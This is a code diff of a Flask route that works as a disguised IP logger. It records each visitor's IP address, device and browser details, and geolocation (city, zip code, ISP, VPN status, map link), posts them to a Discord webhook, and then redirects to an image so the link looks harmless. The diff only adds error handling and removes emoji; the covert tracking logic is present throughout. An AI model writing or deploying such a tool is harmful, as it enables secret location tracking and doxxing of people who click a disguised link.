@@ -33,71 +33,76 @@ def get_ip_info(ip):
 
 @app.route('/')
 def logger():
-    # Extract IP (Vercel uses x-forwarded-for)
-    ip = request.headers.get('x-forwarded-for', request.remote_addr)
-    if ip and ',' in ip:
-        ip = ip.split(',')[0].strip()
-
-    user_agent_string = request.headers.get('User-Agent', 'Unknown')
-    ua = parse(user_agent_string)
-    
-    # Advanced Device Info
-    os_detail = f"{ua.os.family} {ua.os.version_string}"
-    browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
-    device_type = "📱 Mobile" if ua.is_mobile else "💻 Desktop" if ua.is_pc else "📟 Tablet" if ua.is_tablet else "🤖 Bot" if ua.is_bot else "❓ Unknown"
-    
-    full_device_info = f"{device_type} | {os_detail} | {browser_detail} | {ua.device.family}"
-
-    # Get Geo-location
-    geo = get_ip_info(ip)
-    
-    # Prepare Discord Webhook Content
-    embed = {
-        "title": "� Advanced Visitor Logged",
-        "color": 3447003, # Blue
-        "timestamp": datetime.now().isoformat(),
-        "fields": [
-            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
-            {"name": "🛠️ Device Type", "value": f"`{device_type}`", "inline": True},
-            {"name": "📱 Full Device Info", "value": f"```\n{full_device_info}\n```", "inline": False},
-        ]
-    }
-
-    if geo and geo.get('status') == 'success':
-        # Add flags for Proxy/VPN and Mobile network
-        security_status = []
-        if geo.get('proxy'): security_status.append("🚫 Proxy/VPN Detected")
-        if geo.get('mobile'): security_status.append("📶 Mobile Data")
-        
-        security_val = "\n".join(security_status) if security_status else "✅ Direct Connection"
-
-        embed["fields"].extend([
-            {"name": "🌍 Location", "value": f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')} ({geo.get('countryCode')})", "inline": False},
-            {"name": "📮 Zip Code", "value": f"`{geo.get('zip')}`", "inline": True},
-            {"name": "� Currency", "value": f"`{geo.get('currency')}`", "inline": True},
-            {"name": "�️ Connection Security", "value": f"`{security_val}`", "inline": True},
-            {"name": "🛰️ ISP / Organization", "value": f"```\n{geo.get('isp')}\n{geo.get('org')}\n```", "inline": False},
-            {"name": "🗺️ Google Maps", "value": f"[Click to view {geo.get('city')} on Map](https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')})", "inline": False},
-        ])
-    else:
-        embed["description"] = "⚠️ Could not retrieve geolocation info. Possibly a Localhost or Reserved IP."
-        embed["color"] = 15158332 # Red
-
-    payload = {
-        "username": "Advanced IP Locator",
-        "embeds": [embed]
-    }
-
-    # Send to Discord
     try:
-        requests.post(WEBHOOK_URL, json=payload, timeout=10)
-    except:
-        pass
+        # Extract IP (Vercel uses x-forwarded-for)
+        ip = request.headers.get('x-forwarded-for', request.remote_addr)
+        if ip and ',' in ip:
+            ip = ip.split(',')[0].strip()
 
-    # Redirect to image
-    import random
-    redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)
-    return redirect(redirect_url)
+        user_agent_string = request.headers.get('User-Agent', 'Unknown')
+        ua = parse(user_agent_string)
+        
+        # Advanced Device Info
+        os_detail = f"{ua.os.family} {ua.os.version_string}"
+        browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
+        device_type = "Mobile" if ua.is_mobile else "Desktop" if ua.is_pc else "Tablet" if ua.is_tablet else "Bot" if ua.is_bot else "Unknown"
+        
+        full_device_info = f"{device_type} | {os_detail} | {browser_detail} | {ua.device.family}"
+
+        # Get Geo-location
+        geo = get_ip_info(ip)
+        
+        # Prepare Discord Webhook Content
+        embed = {
+            "title": "Advanced Visitor Logged",
+            "color": 3447003, # Blue
+            "timestamp": datetime.now().isoformat(),
+            "fields": [
+                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
+                {"name": "Device Type", "value": f"`{device_type}`", "inline": True},
+                {"name": "Full Device Info", "value": f"```\n{full_device_info}\n```", "inline": False},
+            ]
+        }
+
+        if geo and geo.get('status') == 'success':
+            # Add flags for Proxy/VPN and Mobile network
+            security_status = []
+            if geo.get('proxy'): security_status.append("Proxy/VPN Detected")
+            if geo.get('mobile'): security_status.append("Mobile Data")
+            
+            security_val = "\n".join(security_status) if security_status else "Direct Connection"
+
+            embed["fields"].extend([
+                {"name": "Location", "value": f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')} ({geo.get('countryCode')})", "inline": False},
+                {"name": "Zip Code", "value": f"`{geo.get('zip')}`", "inline": True},
+                {"name": "Currency", "value": f"`{geo.get('currency')}`", "inline": True},
+                {"name": "Connection Security", "value": f"`{security_val}`", "inline": True},
+                {"name": "ISP / Organization", "value": f"```\n{geo.get('isp')}\n{geo.get('org')}\n```", "inline": False},
+                {"name": "Google Maps", "value": f"[Click to view {geo.get('city')} on Map](https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')})", "inline": False},
+            ])
+        else:
+            embed["description"] = "Could not retrieve geolocation info. Possibly a Localhost or Reserved IP."
+            embed["color"] = 15158332 # Red
+
+        payload = {
+            "username": "Advanced IP Locator",
+            "embeds": [embed]
+        }
+
+        # Send to Discord
+        try:
+            requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        except:
+            pass
+
+        # Redirect to image
+        import random
+        redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)
+        return redirect(redirect_url)
+        
+    except Exception as e:
+        import traceback
+        return f"DEBUG ERROR: {str(e)}<br><pre>{traceback.format_exc()}</pre>", 500
 
 # For local testing if needed
 if __name__ == '__main__':
